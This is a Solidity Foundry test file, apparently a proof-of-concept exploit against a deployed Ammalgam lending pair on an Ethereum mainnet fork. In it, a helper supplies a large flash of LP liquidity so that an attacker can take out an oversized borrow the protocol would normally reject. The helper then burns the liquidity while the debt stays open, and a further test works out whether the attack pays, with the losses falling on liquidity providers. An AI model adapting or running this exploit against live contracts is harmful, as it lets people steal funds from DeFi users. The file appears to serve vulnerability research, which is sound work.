// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function repay(address onBehalfOf) external returns (uint256, uint256);
    function sync() external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function externalLiquidity() external view returns (uint112);
    function underlyingTokens() external view returns (address, address);
    function totalAssetsAndShares(bool) external view returns (uint112[6] memory, uint112[6] memory);
}

interface ISat {
    function getTickRange(address pair, uint256 rx, uint256 ry, bool includeLong)
        external view returns (int16, int16);
}

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }
    function mint(address to, uint256 amount) external { totalSupply+=amount; balanceOf[to]+=amount; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s]=a; return true; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al=allowance[f][msg.sender];
        if (al!=type(uint256).max) allowance[f][msg.sender]=al-a;
        balanceOf[f]-=a; balanceOf[t]+=a; return true;
    }
}

contract FlashLpDeepTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;
    address constant SAT_PROXY = 0xAaC0fA3C48d70683650184A80313A998ca48d9fc;

    MockERC20 tokenA;
    MockERC20 tokenB;
    IAmmalgamPair pair;
    MockERC20 assetX;
    MockERC20 assetY;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        tokenA = new MockERC20("A", "A", 18);
        tokenB = new MockERC20("B", "B", 18);
        address p = IFactory(FACTORY).createPair(address(tokenA), address(tokenB));
        pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        assetX = MockERC20(px);
        assetY = MockERC20(py);

        uint256 seed = 1e24;
        assetX.mint(address(this), seed * 50);
        assetY.mint(address(this), seed * 50);
        assetX.transfer(p, seed);
        assetY.transfer(p, seed);
        pair.mint(address(this));

        // Warm up TWAP so long-term range collapses toward spot
        for (uint256 i; i < 40; i++) {
            vm.warp(block.timestamp + 8);
            assetX.transfer(p, 1e15);
            assetY.transfer(p, 1e15);
            pair.sync();
        }
        (uint112 rx, uint112 ry,) = pair.getReserves();
        (int16 mn, int16 mx) = ISat(SAT_PROXY).getTickRange(p, rx, ry, true);
        console2.log("extLiq", pair.externalLiquidity());
        console2.log("ticks after warmup");
        console2.logInt(mn);
        console2.logInt(mx);
    }

    function test_burnAfterBorrow_withWarmTicks() public {
        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx) * 70 / 100;
        uint256 collAmt = (uint256(ry) * borrowAmt / uint256(rx)) * 500 / 100;
        // Minimal flash that still beats slippage: binary-ish try 5x first
        uint256 flashMult = 5;
        uint256 flashX = uint256(rx) * flashMult;
        uint256 flashY = uint256(ry) * flashMult;

        address atk = makeAddr("atk");
        address hlp = makeAddr("hlp");
        assetY.mint(atk, collAmt);
        assetX.mint(hlp, flashX);
        assetY.mint(hlp, flashY);

        // control
        {
            address ctrl = makeAddr("ctrl");
            assetY.mint(ctrl, collAmt);
            vm.startPrank(ctrl);
            assetY.transfer(address(pair), collAmt);
            pair.deposit(ctrl);
            vm.expectRevert();
            pair.borrow(ctrl, borrowAmt, 0, "");
            vm.stopPrank();
            console2.log("control revert OK");
        }

        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();

        vm.startPrank(hlp);
        assetX.transfer(address(pair), flashX);
        assetY.transfer(address(pair), flashY);
        uint256 lp = pair.mint(hlp);
        vm.stopPrank();
        console2.log("flash LP", lp, "mult", flashMult);

        (uint112 rxFlash,,) = pair.getReserves();
        (int16 mn, int16 mx) = ISat(SAT_PROXY).getTickRange(address(pair), rxFlash, ry * flashMult / 1 + rxFlash * 0, true);
        // just log ticks at flash
        (uint112 rxf, uint112 ryf,) = pair.getReserves();
        (mn, mx) = ISat(SAT_PROXY).getTickRange(address(pair), rxf, ryf, true);
        console2.log("ticks at flash");
        console2.logInt(mn);
        console2.logInt(mx);

        uint256 before = assetX.balanceOf(atk);
        vm.prank(atk);
        pair.borrow(atk, borrowAmt, 0, "");
        assertEq(assetX.balanceOf(atk) - before, borrowAmt);
        console2.log("borrow OK", borrowAmt);

        // Try burn flash LP
        vm.startPrank(hlp);
        IERC20(pair.tokens(0)).transfer(address(pair), lp);
        try pair.burn(hlp) returns (uint256 ox, uint256 oy) {
            console2.log("BURN OK outX", ox);
            console2.log("BURN OK outY", oy);
            (uint112 rx2, uint112 ry2,) = pair.getReserves();
            console2.log("rx after burn", rx2);
            console2.log("util X pct", borrowAmt * 100 / uint256(rx2));
            // Debt still there
            assertGt(IERC20(pair.tokens(4)).balanceOf(atk), 0);
            // Same borrow should fail if we tried fresh without flash
            console2.log("FULL EXPLOIT: borrow kept after flash burn");
        } catch (bytes memory reason) {
            console2.log("burn failed");
            console2.logBytes(reason);
            // Try transfer LP to EOA (not pair) — capital not stuck in protocol burn queue
            // Actually tokens already on pair. Recover by... can't easily.
        }
        vm.stopPrank();
    }

    function test_profitability_ifBurnWorks() public {
        // Measure capital locked vs X extracted if burn succeeds at 5x flash
        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx) * 70 / 100;
        uint256 collAmt = (uint256(ry) * borrowAmt / uint256(rx)) * 500 / 100;
        uint256 flashX = uint256(rx) * 5;
        uint256 flashY = uint256(ry) * 5;

        console2.log("capital flash X", flashX);
        console2.log("capital flash Y", flashY);
        console2.log("capital coll Y", collAmt);
        console2.log("extracted X", borrowAmt);
        console2.log("net X if burn returns flashX-borrowApprox", int256(borrowAmt) - int256(0)); // flash returned
        // If burn returns ~flashX and ~flashY, net position: +borrowAmt X, -collAmt Y locked as collateral, flash capital free
        // Profit condition: value(borrowed X) > value(collateral at risk) after bad debt event
        // At spot: borrow = 0.7 * rx, coll = 5 * 0.7 * ry = 3.5 * ry (in Y units matching 0.7 rx)
        // coll value in X = 3.5 * rx (since 1:1), borrow = 0.7 rx → overcollateralized at spot!
        // Loss to LPs is from SLIPPAGE insolvency not spot insolvency
        console2.log("spot coll/borrow ratio bips", collAmt * 10000 / (uint256(ry) * borrowAmt / uint256(rx)));
    }
}
